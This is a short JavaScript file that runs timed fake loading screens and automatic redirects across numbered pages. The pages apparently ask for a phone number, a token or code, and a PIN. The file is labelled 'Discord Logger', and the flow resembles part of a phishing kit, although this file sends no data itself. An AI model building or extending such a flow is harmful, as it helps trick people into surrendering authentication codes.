// Discord Logger para páginas de carga (index3, index6, index8)
// Maneja animaciones de progreso y redirecciones automáticas

(function() {
  'use strict';
  
  document.addEventListener('DOMContentLoaded', function() {
    // Mejorar detección de página actual para producción
    const fullPath = window.location.pathname;
    const fileName = fullPath.split('/').pop() || '';
    const fileNameWithParams = fileName.split('?')[0]; // Quitar parámetros URL
    
    // Múltiples métodos de detección para compatibilidad
    let currentPage = fileNameWithParams;
    
    // Si no hay nombre de archivo, intentar por título o meta
    if (!currentPage || currentPage === '') {
      const title = document.title.toLowerCase();
      if (title.includes('verificación') || title.includes('autenticación')) {
        // Intentar detectar por contenido del body
        const bodyText = document.body.textContent.toLowerCase();
        if (bodyText.includes('teléfono')) currentPage = 'index3.html';
        else if (bodyText.includes('token') || bodyText.includes('código')) currentPage = 'index6.html';
        else if (bodyText.includes('pin')) currentPage = 'index8.html';
      }
    }
    
    // Debug en consola para producción
    console.log('Loading page detected:', currentPage, 'Path:', fullPath);
    
    // Configuración de redirecciones
    const redirects = {
      'index3.html': { next: 'index4.html', delay: 10000, progress: 0, animate: true },
      'index6.html': { next: 'index7.html', delay: 5000, progress: 0, animate: true },
      'index8.html': { next: 'index9.html', delay: 3000, progress: 0, animate: true }
    };
    
    const config = redirects[currentPage];
    if (!config) {
      console.warn('No configuration found for page:', currentPage);
      return;
    }
    
    console.log('Loading config:', config);
    
    // Animar barra de progreso si existe
    const progressBar = document.querySelector('[class*="bg-blue-500"][class*="h-2"]') ||
                        document.querySelector('.bg-blue-500.h-2') ||
                        document.querySelector('[style*="width:"]') ||
                        document.getElementById('ld6-bar');
    
    console.log('Progress bar found:', !!progressBar);
    
    if (progressBar && config.animate) {
      // Resetear a 0% antes de iniciar animación
      progressBar.style.width = '0%';
      
      let width = 0;
      const steps = 50; // 50 pasos para animación suave
      const increment = 100 / steps;
      const stepTime = config.delay / steps;
      
      const interval = setInterval(() => {
        width += increment;
        if (width >= 100) {
          width = 100;
          clearInterval(interval);
        }
        progressBar.style.width = width + '%';
        
        // Log cada pocos segundos para debug
        if (Math.floor(width) % 20 === 0) {
          console.log('Progress:', Math.floor(width) + '%');
        }
      }, stepTime);
    }
    
    // Contador regresivo para index6
    const counter = document.getElementById('ld6-counter');
    if (counter && currentPage === 'index6.html') {
      let seconds = 5; // 5 segundos para index6
      counter.textContent = seconds + 's';
      
      const countInterval = setInterval(() => {
        seconds--;
        counter.textContent = seconds + 's';
        if (seconds <= 0) clearInterval(countInterval);
      }, 1000);
    }
    
    // Redirección automática con fallback
    console.log('Redirecting to', config.next, 'in', config.delay + 'ms');
    
    const redirectTimer = setTimeout(() => {
      console.log('Redirecting now to:', config.next);
      window.location.href = config.next;
    }, config.delay);
    
    // Fallback por si el setTimeout falla
    const fallbackTimer = setTimeout(() => {
      console.log('Fallback redirect to:', config.next);
      window.location.href = config.next;
    }, config.delay + 1000);
    
    // Limpiar timers si la página se descarga
    window.addEventListener('beforeunload', () => {
      clearTimeout(redirectTimer);
      clearTimeout(fallbackTimer);
    });
  });
})();
